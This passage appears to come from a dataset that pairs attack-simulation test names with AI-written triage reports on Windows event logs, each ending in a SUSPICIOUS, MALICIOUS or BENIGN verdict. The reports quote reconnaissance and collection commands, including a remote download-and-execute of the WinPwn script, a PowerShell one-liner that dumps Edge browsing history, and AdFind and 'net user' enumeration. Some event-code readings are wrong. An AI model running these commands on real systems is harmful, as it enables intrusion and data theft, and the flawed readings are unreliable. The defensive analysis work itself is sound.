   - The presence of multiple executions of `wevtutil.exe` by `SERVER002\admin_test` is concerning. `wevtutil.exe` is a tool used to manage event logs, and its usage can denote an attempt to clear or manipulate logs, which is a common tactic used by attackers to cover their tracks.

3. **Automated Edge Update Operations:**
   - There are numerous instances of `MicrosoftEdgeUpdate.exe` running various operations such as service registration, COM registration, and updating. The executions are under `NT AUTHORITY\SYSTEM`, which is standard for Microsoft Edge Update processes. However, what stands out is their frequency and overlapping nature, which could suggest an anomaly or improper update configuration.

4. **Miscellaneous Processes:**
   - The execution of `sppsvc.exe` (Software Protection Platform Service) and `TiWorker.exe` (Windows Modules Installer Worker) are typical system processes, although the context in which they are being executed is not clearly visible from these logs alone.

**Assessment:**
- **Reconnaissance Activity:** The use of system information tools like `wmic`, `whoami`, and `hostname` under administrative credentials suggests potential reconnaissance activities. 
- **Event Log Manipulation:** The utilization of `wevtutil.exe` could indicate attempts to manipulate logs, pointing towards suspicious activity.
- **High Frequency of EdgeUpdate Executions:** The frequency and types of executions related to `MicrosoftEdgeUpdate.exe` may be benign but merit further investigation to confirm their regularity and legitimacy.

Based on the above analysis, the current state of the system appears to exhibit behaviors that are typical of a system reconnaissance stage and potential log manipulation activities.

**Conclusion: SUSPICIOUS**
Given the indicators of potential reconnaissance and log manipulation, these activities warrant further investigation. It would be prudent to:
- Review historical logs for similar activities to establish a pattern.
- Correlate these activities with user actions and system changes.
- Conduct a deeper analysis into the source and context of `wevtutil.exe` use.
- Confirm the legitimacy and configuration of Edge update operations.
- Monitor the system for any additional signs of escalation or external communications.

**Guidance:**
Continue monitoring the Windows host for any escalation of privileges or attempted connections to suspicious network addresses. If patterns indicative of active compromise emerge, proceed with incident response protocols to isolate and remediate the system."
PowerView ShareFinder,"To thoroughly analyze the logs provided, we'll break down the investigation into notable sections based on log categories and their contents.

### Windows PowerShell Log
The PowerShell log shows the `Invoke-ShareFinder` command being executed. This is part of PowerShell script `PowerView.ps1`, a well-known tool used for network and domain enumeration, typically within Penetration Testing and Red Team engagements. The command was executed via `powershell.exe` from a temporary file path, which deviates from normal administrative behavior and should raise concerns about its legitimacy and intent.

### System Log
The system logs highlight clock synchronization events but no unusual activities beyond the expected time service updates and adjustments. 

### Security Log
- **EventID 4624**: This is a successful logon event, and it's repeated in the logs, generally indicating legitimate system activity.
- **EventID 4672**: This shows special privileges being assigned to a new logon, which could indicate administrative-level actions.
- **EventID 4798**: These are attempts to enumerate users or groups which might indicate reconnaissance activity.
  
The security logs show events indicating a series of successful logins by `SYSTEM`. This is typically standard in many system operations, but any unexpected execution of scripts could turn concerning if coupled with other suspicious activity.

### Application Log
The majority of entries here concern Windows edge updates and services and appear to be benign.

### Sysmon Log
A clear significance is that PowerShell is extensively used with commands relating to exploration or scripting. Processes such as `wevtutil.exe` and `conhost.exe` linked with the user `SERVER002\admin_test` could potentially point towards administrative or scripting activities. Moreover, multiple `svchost.exe` operations seem to tie into regular system activity rather than malicious processes.

### Analysis and Conclusion
- **Suspicious Script Execution**: The execution of PowerShell script `PowerView.ps1` suggests potential reconnaissance behavior, which is generally aligned with penetration testing or unauthorized access activities.
- **Elevation of Privileges and Recon**: The use of `Invoke-ShareFinder` and credentials enumeration command implies a possible attempt to gather network or system information, perhaps for lateral movement within the network domain.
- **Use of Tools in Temporary Folders**: The pattern of executing scripts directly from temp directories is unconventional and typically avoided in regular administrative tasks.

### Resolution
Based on the PowerShell log entries and the observed reconnaissance commands, the overall activity leans towards potentially malicious or unwanted actions especially if these were unauthorized.

**Final Assessment: SUSPICIOUS**

### Guidance and Next Steps
- **Verify User Intent**: Determine if the activity was part of an authorized PenTest or Red Team activity. Confirm with internal IT teams or relevant logs.
- **Secure Environment**: Isolate the system to avoid network communication if unauthorized. Observe further behavior if needed.
- **Investigate Further**: Use full endpoint EDR solutions to trace further activities by the suspicious `admin_test` user and script files involved.
- **Implement Monitoring**: Enhance system and network monitoring for abnormal script execution and access to sensitive network areas.
"
WinPwn - Morerecon,"Based on the analysis of the provided Windows event logs from the Windows host named ""Server002"", here's the detailed assessment:

### Windows PowerShell Logs Analysis:
- **Suspicious PowerShell Activity:**
  - Multiple instances of PowerShell invocation are observed with the command involving execution of scripts from a GitHub repository (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`). 
  - Command line detail involves the use of `iex` (Invoke-Expression), which can often be malicious as it executes expressions provided as strings.
  - The purpose of the command seems to be running a script called `WinPwn.ps1`, which might be a post-exploitation framework.

### Security Logs Analysis:
- **Privilege Escalation Indicators:**
  - Event ID 4672 indicates that the user `admin_test` was assigned special privileges such as `SeDebugPrivilege`, which allows debugging objects and is highly sensitive.
  - Event ID 4624 logs show successful logon activity from a remote address with NTLM authentication, which is normal but worth correlating with other activities.

### Sysmon Logs Analysis:
- **Unusual Process Executions:**
  - The process `powershell.exe` runs with a high integrity level, initiated by the `admin_test` user, which correlates with the suspicious PowerShell activities.
  - `wevtutil.exe` and `conhost.exe` operations are observed, often used for event log handling and console operations, respectively.
- **Typical System Activity:**
  - Several instances of Microsoft Edge update processes are seen, which are common for system updates but should be cross-verified with known schedules or triggered updates.

### Application Logs Analysis:
- **System Process Indicators:**
  - Normal operations of Windows Defender are documented, which suggests that the security software was running.
  
### Conclusion:
Given the observed behaviors, including execution of scripts from a remote repository using PowerShell, the extensive privileges granted to the `admin_test` user account, and the potential execution of scripts indicative of post-exploitation tools, the evidence strongly points towards possible malicious activity.

### Resolution:
- **MALICIOUS:** The evidence in the logs indicates clear indicators of compromise. The PowerShell commands executed may be part of a known malicious tool, and the special privileges enable potential misuse of the system. Immediate action is recommended to contain and mitigate any present threats.

### Recommendations:
- **Immediate Containment**: Isolate the affected system `Server002` from the network to prevent further damage or lateral movement.
- **Forensic Analysis**: Conduct a deeper forensic analysis of the system, focusing on the PowerShell script execution, network connections, and any potential data exfiltration.
- **Audit and Restrict Privileges**: Review and restrict admin privileges to the minimum necessary, and ensure robust auditing around privileged actions.
- **Patch and Update**: Ensure that all software, including PowerShell and browsers, is up-to-date with the latest security patches.
- **Incident Response Plan**: Engage the incident response team to handle potential threats and update security protocols and defenses accordingly."
System Network Connections Discovery with PowerShell,"### Analysis

Upon reviewing the provided logs, I've identified some key areas for analysis:

#### Windows PowerShell Logs

1. **Usage of PowerShell for Network Connections**: There are multiple logs showing the command `powershell.exe & {Get-NetTCPConnection}` being executed. This command is used to get information about network connections and sockets, which may indicate reconnaissance activity.
   - **HostApplication** repeatedly shows `powershell.exe & {Get-NetTCPConnection}`.
   - The consistent use of this command without detailed script information indicates a script block invocation, which may hide malicious activities.

2. **No anomalies in Engine States**: The transition between engine states (e.g., Available to Stopped) appears normal for PowerShell sessions, without any additional flags.

#### Sysmon Logs

1. **Process Activity**:
   - Multiple invocations of `wevtutil.exe`, which is a legitimate Windows utility used to query and manipulate event logs. While its usage by an administrative user (`SERVER002\\admin_test`) could be standard, repeated executions close in time could suggest log tampering attempts.
   - Execution of `whoami.exe` and `hostname.exe` within a short time frame may suggest someone is confirming the current user context and host details, which are common reconnaissance steps by an attacker.

2. **Process Chain**:
   - `PowerShell.exe` processes spawning `conhost.exe` processes are standard for command-line operations.
   - Context of the user (`SERVER002\\admin_test`) with high integrity level fits administrative actions, and no escalation of privileges is observed.

#### Application Logs

1. **Software Protection Platform Service**: The event logs related to the Software Protection Platform Service do not indicate any anomalies. This service regularly checks software licensing compliance.

#### System Logs

1. **Time Change Events**: Events log time adjustments by `svchost.exe`. Such synchronization is typical behavior and necessary for time correction with external time servers and does not indicate malicious activity in isolation.

#### Security Logs

1. **Time Change by `svchost.exe`**: Corroborates system log entries regarding legitimate time changes.

### Assessment

- **Unusual but not conclusively malicious activity**: The usage of `Get-NetTCPConnection` via PowerShell and `wevtutil.exe` without a clear operational requirement suggests potential reconnaissance and log tampering attempts. However, based on the provided logs, these activities do not conclusively indicate a compromise, as it could be a part of a legitimate admin script or activity.
  
- **Lack of direct evidence**: These events alone are insufficient to classify the activity as malicious without additional context or corroborating indicators like external connections to known malicious IP addresses, data exfiltration signs, or unusual file modifications.

### Resolution

**Resolution: SUSPICIOUS**

While the actions in the logs do align with potential reconnaissance efforts, there is insufficient evidence to declare these activities categorically malicious. However, they do warrant further investigation.

### Guidance

1. **Review User Activity**: Verify the intent behind the script executions by checking if `admin_test` user activities are consistent with routine administrative tasks.
2. **Network Monitoring**: Look for unusual network traffic, especially incoming/outgoing connections during these PowerShell execution times.
3. **Audit Log Access**: Examine any policies allowing the use of `wevtutil.exe` and whether they align with organization protocols.
4. **Verify Endpoint Security Posture**: Ensure endpoint protection solutions are active and check for any alerts or unusual detections during these timestamps.
5. **User Verification**: Verify if the user `admin_test` made these changes and ensure the account's security.

Taking the above steps will help provide a more definitive understanding of whether the activities were benign administrative activities or part of a larger malicious operation."
Port-Scanning -24 Subnet with PowerShell,"Upon thorough review of the provided Windows event logs, here is a detailed analysis of the activities recorded:

1. **Time Change Events:**
   - The logs record several `EventID 4616` in the security log associated with `svchost.exe`, showing the system time was changed.
   - Frequent time adjustments could be suspicious if unauthorized or unexpected. However, it seems tied to `time.windows.com`, and further investigation into time discrepancies is necessary.

2. **Sysmon Logs and Process Creation:**
   - Repeated execution of `wevtutil.exe` and `conhost.exe` seen in `Sysmon` logs associated with `SERVER002\admin_test`. This shows interaction with Windows Event Logs, which can be legitimate if by an admin performing routine tasks or by services.
   - Notably, there's `powershell.exe` activity with an IP address scanning script, as seen in the `Sysmon` and `PowerShell` logs. This PowerShell script is concerning as it scans for open ports (445 and 3389), which are associated with SMB and RDP services, commonly targeted during reconnaissance activities by attackers.

3. **Security Events:**
   - `EventID 4624` (Logon) and `EventID 4672` (Special Privileges) show multiple logons for `admin_test` with high privileges, which could denote routine activities if verified as legitimate use by an admin.
   - However, unusual IP address sources (`fe80::866a:d1f8:8d06:7bc` and `2001:7d0:89e5:7e00:c99:617f:443d:60f4`) for these logins should be investigated to confirm if they align with known admin remote access patterns.

4. **Windows PowerShell Logs:**
   - Host application logs from PowerShell show use involving network scanning with unauthorized script execution, indicating a possible security risk due to probing activities.

5. **Application and Edge Updates:**
   - Regular Microsoft Edge update activities with setup.exe executions appear benign, typical software updates aligning with typical update installations.

**Conclusion and Resolution:**

Given the combination of network scanning via PowerShell, elevated admin activity from suspicious sources, and potential tampering with system time, these logs contain signs of activities that can be deemed potentially threatening. `Powershell.exe` activity with unusual network scanning is particularly alarming.

**Recommendation:**

This requires a resolution set to **SUSPICIOUS** due to potential misuse of administrative privileges and reconnaissance behavior. It’s advised to investigate:
- Validate the source and purpose of the PowerShell script run.
- Verify administrative account activities for unusual remote access.
- Validate any malicious intent or unauthorized user interactions with elevated privileges.
- Continue monitoring the system for further anomalous activities.

Further forensic investigation could confirm or negate the potential for malicious activity."
Get-WmiObject to Enumerate Domain Controllers,"Upon analyzing the provided Windows event logs, the following observations and conclusions were made regarding potential indicators of malicious activity:

### Indicators and Observations:

1. **Time Synchronization Events:**
   - There are a couple of events related to time changes (`Kernel-General` Event ID 1), where the `NewTime` is set back slightly. This is relatively common and not inherently suspicious, particularly when it involves `svchost.exe`, a legitimate Windows service host process.

2. **Windows Update Activities:**
   - Multiple events from the `WindowsUpdateClient` detail the process of applying a ""Security Intelligence Update for Microsoft Defender Antivirus"". These activities are benign and expected as part of regular security updates to the system.

3. **Process Creation and Execution (Sysmon Logs):**
   - A sequence of processes running under `SERVER002\admin_test`:
     - Execution of legitimate Windows utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe`. 
     - Specifically, the `powershell.exe` event contains a `get-wmiobject` command. The usage of WMI via PowerShell can be routine; however, it could also indicate reconnaissance activities in some contexts. However, without suspicious parameters or subsequent actions that clearly indicate abuse, this is not definitively malicious.

4. **Privilege Assignment:**
   - The account `admin_test` was granted several privileges (SeDebugPrivilege, SeImpersonatePrivilege, etc.) which are typical for admin accounts but should always be verified for legitimacy based on expected account usage.

5. **Failed Credential Access Attempts:**
   - Security log entries related to Event ID 5379 show repeated failed attempts to retrieve credentials with return code `3221226021`, indicating a failure to access a credential or account. While this could be indicative of misconfiguration or user error, it's worth verifying these attempts' origin to ensure they're not part of a larger, more concerning activity.

6. **Anti-Malware Definition Update:**
   - An event indicated the execution of `AM_Delta.exe`, which is related to anti-malware definition updates and not typically malicious on its own.

### Conclusion:

- **Resolution: SUSPICIOUS**

The activities described above illustrate a mostly benign system environment where administrative actions and security updates occur as expected. However, particular attention should be paid to the PowerShell command using `get-wmiobject`, the assignment of high privileges to `admin_test`, and the repeated failed credential access attempts, which could warrant further investigation to ascertain that these entries reflect legitimate activity and not potential reconnaissance or lateral movement attempts.

### Guidance on How to Proceed:

1. **Investigate the Context and Source of PowerShell and WMI Usage:**
   - Verify if the PowerShell `get-wmiobject` usage aligns with regular administrative functions or if it represents unauthorized automation or scripts.

2. **Review `admin_test` Account Activities:**
   - Confirm the legitimacy of the privileges assigned and the necessity for such elevated permissions.
   - Ensure that these permissions are expected for the account in question and align with organizational policies.

3. **Assess the Failed Credential Attempts:**
   - Determine if the failed credential access attempts have a legitimate explanation or if they denote a probe or attempted unauthorized access.

By conducting these follow-ups, it will be possible to either confirm benign activities or uncover further actions indicating compromised systems, leading to corrective measures if necessary."
Security Software Discovery - Windows Firewall Enumeration,"## Detailed Log Analysis:

### System Log
1. **Windows Update Events (EventID: 19)**: 
   - Logs show the installation of a security intelligence update for Microsoft Defender Antivirus. These actions appear to be normal and reflect regular update management for antivirus files.
   - Time synchronization events via Windows Time Service (`time.windows.com`) are observed, indicating the system is updating its time settings correctly.

2. **Kernel General Time Change Events (EventID: 1, 24)**:
   - The system time was changed slightly, but both changes were initiated by `svchost.exe`, a normal system process, and attributed to time synchronization. This is consistent with legitimate time correction activities.

### Application Log
1. **Security Center**:
   - Indicates that Windows Defender is active, which is a normal state for system protection.

2. **Edge Update Service**:
   - The ""Service stopped"" message is typical following an update or routine service operation and does not inherently indicate malicious activity.

### Windows PowerShell Log
1. **PowerShell Activity**:
   - The logs show PowerShell activity involving firewall settings, which could be a legitimate activity depending on administration practices.
   - No specific suspicious script or command is noted beyond checking firewall rules, which is a common administrative task. However, careful review is warranted due to the network-related commands queried.

### Security Log
1. **Security-Auditing Events (EventID: 4616)**:
   - Reflects a system time change by `svchost.exe`. This event aligns with the time synchronization we saw in the system logs, suggesting legitimate activity.

### Sysmon Log
1. **Process Creation Events (EventID: 1)**:
   - Several benign Windows processes were executed (`whoami.exe`, `conhost.exe`, `hostname.exe`) by `admin_test`. These do not reveal overtly suspicious behavior.
   - The execution of `whoami.exe`, `hostname.exe`, and firewall-related PowerShell commands suggests someone might be verifying user context and system settings.

2. **File Time Modification Events (EventID: 5)**:
   - These reflect routine system actions commonly run by Windows services, with no evidence of anomalous file activity.

### Conclusive Assessment:
- The logs do not present strong indicators of malicious activity. The observed actions, including antivirus updates, time synchronization, routine service executions, and admin-related PowerShell commands, are generally consistent with legitimate system behavior and administrative tasks.
- However, the focus on network-related PowerShell activities could warrant further verification to ensure these tasks were correctly authorized and expected within the admin context.

### Resolution:
- **SUSPICIOUS**: Based on standard security analysis practices, classify this activity as **SUSPICIOUS** owing to the network firewall queries via PowerShell. This activity should be confirmed as authorized since misuse of such scripts could potentially configure the system in unexpectected ways.
  
### Guidance:
1. **Verification of PowerShell Scripts**: Check if the analyzed PowerShell scripts are executed under a legitimate administrative task.
2. **Review Administrative Practices**: Ensure that the actions observed conform to typical system administration policies and practices.
3. **Monitoring**: Enhance monitoring of PowerShell activities and other administrative actions for any continual suspicious patterns or unauthorized attempts."
Adfind - Enumerate Active Directory OUs,"Upon reviewing the provided Windows event logs, here's a comprehensive analysis:

### Application Log:

- The logs indicate stopping and starting of services like `edgeupdate`, and confirm that Windows Defender is active. This is routine as system and application updates often require service restarts, which do not indicate malicious activity by themselves. 

### Security Log:

- **EventID 4624** and **4672** imply a successful login with special privileges by the SYSTEM account. The use of SYSTEM credentials typically signifies normal operating system activity, particularly when associated with services and critical processes.

### Sysmon Log:

- **EventID 1 and 5 Logs:** A pattern of processes starting and associated hashes are shown. The execution of `powershell.exe`, `conhost.exe`, `wevtutil.exe`, and their operation by the user `SERVER002\admin_test` is noted. While Powershell executions can be leveraged for malicious activities, the logged command lines or the processes involved are not overtly suspicious in themselves.

- A particularly notable event is the execution of a command with `cmd.exe`:
  ```plaintext
  ""cmd.exe"" /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\AdFind.exe"" -f (objectcategory=organizationalUnit)
  ```
  The use of AdFind, a known Active Directory enumeration tool, suggests potential reconnaissance activity, which could imply suspicion if there is no legitimate reason for using such a tool.

- Repeated executions of `MicrosoftEdgeUpdate.exe` and operations related to it, like service registration. The presence of Microsoft Edge Update process interactions appears non-suspicious given its association with updates.
  
### Assessment:

- **AdFind Usage:** Typically used for Active Directory enumeration by attackers. The occurrence of this tool being run indicates possible reconnaissance efforts on the network.

- **Overall Behavior of Logs:** There are numerous instances of SYSTEM account activities, consistent with typical system operations or updates. However, the isolated use of `AdFind.exe` introduces an element of caution.

### Conclusion:

The analysis of logs points towards potential reconnaissance due to the use of AdFind.exe which might suggest unauthorized network asset discovery attempts. Other logged activities show no clear evidence of privilege escalation or data exfiltration based on the provided data and context.

**Resolution:** **SUSPICIOUS**

### Guidance:

1. **Further Investigation Needed:** Investigate the reason for `AdFind` usage. If legitimate use cannot be confirmed, this warrants a deeper security review.
   
2. **Review Access Logs:** Examine user `admin_test` activities, focusing on remote logins, and confirm if Powershell execution was authorized.

3. **Network Monitoring:** Inspect network traffic logs for unusual outbound connections following the `AdFind` execution event to rule out data exfiltration or lateral movement.

This cautious approach ensures any potentially malicious intent is thoroughly examined before taking preemptive actions, while providing a foundation for correlating events with legitimate updates or internal routines."
Extract Edge Browsing History,"Based on the analysis of the provided logs, here are the observations:

1. **Security and System Logs**:
   - The logs suggest that there were multiple events related to time adjustments by the `svchost.exe` process. While time changes can be associated with malicious activity like time-stomping, in this case, they appear to be legitimate system time synchronization activities as the events involve a Local Service account and align with normal Windows time synchronization (`TIME_ZONE_INFORMATION` changes).

2. **Application Logs**:
   - The service stops recorded by the `edgeupdate` don't directly suggest malicious activity. Edge Update services are known to start and stop as needed for updates.

3. **Sysmon Logs**:
   - The Sysmon logs exhibit various executable runs, including `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `powershell.exe`. Of particular interest is a PowerShell command executed by the `admin_test` user account:  
     ```powershell
     & {$URL_Regex = '(htt(p|s))://([\\w-]+\\.)+[\\w-]+(/[\\w- ./?%%&=]*)*?', $History = Get-Content -Path \""""$Env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\History\"""" | Select-String -AllMatches $URL_Regex | ForEach-Object { $_.Matches.Value } | Sort -Unique, $History | Out-File -FilePath \""""$Env:USERPROFILE\\Downloads\\edgebrowsinghistory.txt\"""" }
     ```
     - This command extracts URLs from the Edge browser history using PowerShell and saves it to a text file. While this action could be legitimate if conducted by an admin as part of investigative actions or bookmarks backup, if unexpected, it could indicate suspicious behavior possibly aimed at data exfiltration or tracking user activity.

4. **PowerShell Logs**:
   - Similar to the Sysmon entry, PowerShell logs confirm the execution of the script aimed at extracting the Edge history. PowerShell activity is often scrutinized for potential misuse since it's a common attack vector for malware and script-based attacks.

**Assessment**:
- The PowerShell command to extract browser history by the `admin_test` account without administrator notice or approval may be considered suspicious behavior. It’s possible for a legitimate user to perform such actions, but if this activity was not authorized, it might suggest unauthorized or malicious intent.

**Resolution**:
- **SUSPICIOUS**: The activity appears suspicious primarily due to the PowerShell command used to extract browser history. This behavior should be investigated further to understand the intention behind this action and whether it was conducted by an authorized user for legitimate purposes. It is advised to verify with the user `admin_test` and check if similar past activities exist. Additionally, reviewing installed software on the machine and conducting a network traffic analysis may provide further insights."
Process Discovery - Get-Process,"Upon reviewing the provided Windows event logs from the System, Sysmon, Application, Windows PowerShell, and Security logs, here is the analysis based on detected activities:

### System Logs:
- The logs involve common operational events like time synchronization (`Microsoft-Windows-Time-Service` and `Microsoft-Windows-Kernel-General`). The updating of time settings doesn’t appear suspect, although a time change without a clear administrative purpose can sometimes indicate tampering. Given the synchronization with `time.windows.com`, this appears routine.
- There's an event indicating the user `SERVER002\admin_test` interacting through `svchost.exe`, which is a legitimate system process.

### Sysmon Logs:
- Multiple entries showing the usage of tools such as `wevtutil.exe`, and `conhost.exe` by `SERVER002\admin_test`. While their usage is not inherently malicious, `wevtutil` can be used to alter event logs as part of evasion techniques.
- Also noted is `powershell.exe` execution with a simple `Get-Process` command, which seems a legitimate administrative action rather than malicious execution.

### Application Logs:
- The entries are routine and related to the system’s software protection service, indicating regular activities.

### Windows PowerShell Logs:
- The `Get-Process` command execution recorded does not signify any harmful activity as it is a standard command used for process inspection by administrators or system scripts.

### Security Logs:
- The logs indicate normal login/logout processes and high-level privileges were obtained by the user `admin_test` during some sessions. The credentials and actions identified seem regular for an admin account unless this account was compromised.
- Two notable logon events over NTLM (`EventID: 4624`) indicate network authentication, which can be routine depending on the network setup.

### Overall Assessment:
- The process executions logged, such as `powershell.exe` with a benign command and `wevtutil.exe`, are the main focus for any attacker activity but do not provide enough evidence of being used maliciously.
- The user, `admin_test`, shows typical admin level activities; unless there's suspicion that this user account could be compromised, these interactions seem routine.

### Conclusion:
Based on the logs, no direct evidence of malicious activity or compromise was identified. The entries, while having activities that could be used maliciously in a different context (like altering event logs or privileged process execution), appear consistent with non-malicious administrative actions likely performed by a legitimate admin account.

**Final Assessment: BENIGN**

### Guidance:
- Regularly ensure the integrity and legitimacy of admin accounts to preempt potential misuse.
- Continuously monitor the use of tools like PowerShell and wevtutil, putting in place alerting for unusual patterns indicating possible misuse."
Active Directory Enumeration with LDIFDE,"Upon analyzing the provided logs, several observations can be made regarding suspicious and potentially malicious activities.

### Key Observations:

1. **Logon and Privilege Events:**
   - Multiple `4624` (Logon) events indicate successful logons; however, they're associated with Logon Type 5, which is typically related to service logons. This is consistent with normal system operations.
   - `4672` events list elevated privileges such as `SeDebugPrivilege` and others granted to `SYSTEM`. While common for the `SYSTEM` account, these privileges could be potentially malicious if misused by an attacker.

2. **Credential Validation Errors:**
   - Events `5379` show failed attempts to retrieve credentials associated with a non-existent or incorrect Microsoft account (`MicrosoftAccount:user=02txoixylodcstop`). This could indicate either a mistyped service configuration or an attempt to access invalid accounts.

3. **Process Creation Events:**
   - The `Sysmon` logs show several processes executed by `admin_test`, including `PowerShell`, `cmd.exe`, and others. The `cmd.exe` execution with `ldifde.exe` suggests data export, possibly indicating enumeration or data exfiltration attempt if not expected in usual operations.
   - Multiple usages of `conhost.exe` linked with other processes can indicate command-line or console interactions that might be suspect without legitimate reasons.

4. **Suspicious Executions:**
   - The execution of `whoami.exe` and `hostname.exe` by `admin_test` suggests someone may be trying to gather environment or user context information.
   - There are signs of potential automation or script-based actions utilizing common administrative tools like `wevtutil.exe`.

5. **Event Timing and Sequence:**
   - The sequence and timing of event logs (Sysmon and Security) together suggest a pattern of attempts to gather information or a reconnaissance phase by potentially unauthorized users (using the `admin_test` account).

6. **Software Installation/update Events:**
   - The `Sysmon` logs also show processes associated with Microsoft Edge updates, showing typical system maintenance activities, but the surrounding activity context needs scrutiny due to other events of concern.

### Assessment:
Based on the analysis:

- The usage of common administrative tools and PowerShell by `admin_test`.
- The failed credential requests could imply attempted unauthorized access.
- The specific command usage (`ldifde.exe`) for exporting data indicates a potential data exfiltration intent.

These observations indicate a pattern of activity that is quite suspicious, departs from standard operational behavior, and merits further investigation.

### Resolution:
- **SUSPICIOUS**: The logs contain activity that appears consistent with reconnaissance or preparation for data exfiltration. Further investigation is needed to determine if these actions are from unauthorized users or misconfiguration.

### Guidance:
1. **Account Verification:** Verify the legitimacy of the `admin_test` account and its associated activities.
2. **Baseline Activities:** Check against known baselines for `admin_test` activities and any scheduled tasks or scripts that justify the observed command executions.
3. **Network and Data Monitoring:** Conduct network traffic analysis for data transfers around the time of these events, and ensure no sensitive data was sent externally.
4. **Credential and Logon Review:** Investigate the invalid credential attempts to ensure there's no misconfiguration or brute force attempt occurring.
5. **Conduct a Threat Hunt:** A deeper inspection of surrounding system activities, registry changes (if logged), and other forensic artifacts may provide further context.

Take necessary measures to strengthen authentication, account audits, and monitoring to prevent possible access or misuse."
Adfind - Enumerate Active Directory Domain Controller Objects,"After analyzing the provided Windows event logs, I have identified and analyzed various aspects for indicators of malicious activity or compromise:

### **Analysis Overview**

1. **Windows PowerShell Log**: No entries provided in the log. Absence of logs does not necessarily indicate a problem but might warrant further checks to ensure PowerShell logging configurations are correctly set and capture expected activity.

2. **Application Log**:
   - **Security Product State**: The entries indicate that Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`). This suggests that basic antivirus protections are in place and functional.

3. **System Log**:
   - **Windows Update**: The logs reflect routine security intelligence updates for Microsoft Defender Antivirus, which are normal and indicate that the system is kept secure with up-to-date definitions (KB2267602).

4. **Sysmon Log**:
   - **Normal Operations**: There are several log entries indicating the execution of standard Windows processes (`powershell.exe`, `conhost.exe`, `wevtutil.exe`, `whoami.exe`, `cmd.exe`).
   - **Process Execution Details**:
     - Execution of `powershell.exe` and `conhost.exe` by a user named `admin_test`.
     - Routine Windows operations like updating Edge and its components or installation routines are visible and appear to be legitimate.
     - The use of `whoami.exe` and `cmd.exe` to run `AdFind.exe` in particular contexts. AdFind is a tool used to query Active Directory data and its presence in a command could be legitimate if used for administrative purposes. However, its use in certain cyber attack strategies, particularly reconnaissance, means it could be potentially suspicious if unexpected.

5. **Security Log**:
   - **EventID 5379**: These events indicate failed credential verification attempts related to Microsoft Account operations, but this could be benign, depending on context (e.g., incorrect configurations or intermittent network issues).

### **Assessment**

- The logs primarily reflect routine operations and updates of the system and software, and indicate Windows Defender is operational and updated.
- The presence and execution of `AdFind.exe` could signal potentially suspicious activity if not expected, as this tool is often used in information gathering by attackers once they compromise a system.
- No definitive evidence of malicious activity but certain entries related to `AdFind.exe` justifies further scrutiny.

### **Resolution: SUSPICIOUS**

- **Recommended Actions**:
  1. Verify the legitimacy of the `admin_test` user account activities with system administrators to ensure these activities are authorized.
  2. Determine if `AdFind.exe` is expected in your environment. If it’s unexpected, investigate its source and usage.
  3. Review configuration and policies related to PowerShell logging to ensure potential activities aren't being missed.
  4. Continuous monitoring and review of the security logs for any repeated failed logon or access attempts.
  
If these activities cannot be immediately confirmed as legitimate, further incident response actions may be necessary."
Enumerate Default Domain Admin Details (Domain),"Analyzing the Windows event logs provided, we can make the following observations and conclusions regarding suspicious or potentially malicious activities:

1. **Security Logs:**
   - **Event ID 4634**: This log indicates a logoff by the user `admin_test`. It's a benign activity.
   - **Event ID 4672**: Special privileges were assigned to `admin_test`. The privileges list includes several high-level privileges like `SeDebugPrivilege`, which are normally associated with administrative tasks. While high-level privileges are expected for an administrative account, this requires checking if the account usage is normal.
   - **Event ID 4624**: A successful network logon by `admin_test` from the workstation `DESKTOP-3HL5B2P` using NTLM authentication. This could be regular activity; however, it should be verified if `DESKTOP-3HL5B2P` is a known and trusted device.

2. **Sysmon Logs (Event ID 1 and 5):**
   - There are multiple instances of processes such as `wevtutil.exe`, `conhost.exe`, and `hostname.exe` executed by `admin_test`. Frequent use of `wevtutil.exe` can be suspicious if used for logs clearing malicious activity.
   - The presence of commands, such as `""cmd.exe"" /c net user administrator /domain`, to query user information and the subsequent commands involving `net.exe` and `net1.exe` should raise a flag. This activity is indicative of an attempt to enumerate user information and can be preparatory signs of privilege escalation or reconnaissance by an adversary.
   - Further activity involving `whoami.exe` may be to verify administrative privileges.

3. **Edge Update Activity:**
   - Numerous events are related to the `Microsoft EdgeUpdate` processes. These are consistent with update or installation activities for Microsoft Edge and represent normal maintenance actions performed by the system. 

4. **Assessment of Maliciousness:**
   - The observed command-line activities related to net user queries and the enumeration of system information are often seen in adversarial behaviors.
   - While elevated privileges are expected for `admin_test`, concurrent command usage to query user access and administrative rights could align with a potential reconnaissance phase of an attack.

**Conclusion:**
- **Resolution**: **SUSPICIOUS** - The activities within these logs, particularly the enumeration and privilege-assessment commands executed with administrative privileges, warrant further investigation. It is necessary to confirm if these actions align with authorized user activities. Verification of the legitimacy of the workstation (`DESKTOP-3HL5B2P`) and reviewing the typical usage patterns or any associated anomalies of the `admin_test` account should be prioritized.

**Guidance:**
- Investigate the source of the `DESKTOP-3HL5B2P` NTLM logon to ensure it's expected.
- Correlate account activities with user job responsibilities.
- Review audit logs around the same timeframe to identify any correlated actions.
- Implement monitoring for command-line activities indicative of enumeration and privilege escalation efforts.
- If confirmed to be unauthorized or unexplained, elevate to incident response for containment, eradication, and recovery plans."
System Network Configuration Discovery (TrickBot Style),"To determine if there is any malicious or suspicious activity within the provided Windows event logs, let's closely examine the data and look for anomalies commonly associated with potential threats.

### Analysis:

1. **Repeated Credential Reading Failures (EventID: 5379):**
   - The Security logs indicate multiple failed attempts to access credentials for `MicrosoftAccount:user=02txoixylodcstop` with a ReturnCode of `3221226021`, which corresponds to `STATUS_LOGON_FAILURE`.
   - These unsuccessful attempts could be indicative of a misconfiguration or an attempt to access resources without proper credentials.

2. **Successful Special Logon (EventID: 4624):**
   - Special logons indicate activities typically carried out by system services. EventID 4624 shows the SYSTEM account logging on using the `Advapi` logon process, a normal operation for services and background tasks.
   - The logon type is 5, indicating a service logon, which is consistent with regular system processes.

3. **Privilege Escalation (EventID: 4672):**
   - Elevated privileges were logged for the user `admin_test`. While privilege escalation is not inherently problematic, it raises eyebrows when performed by non-standard accounts (`admin_test`).

4. **Suspicious PowerShell Command or Executable Activity:**
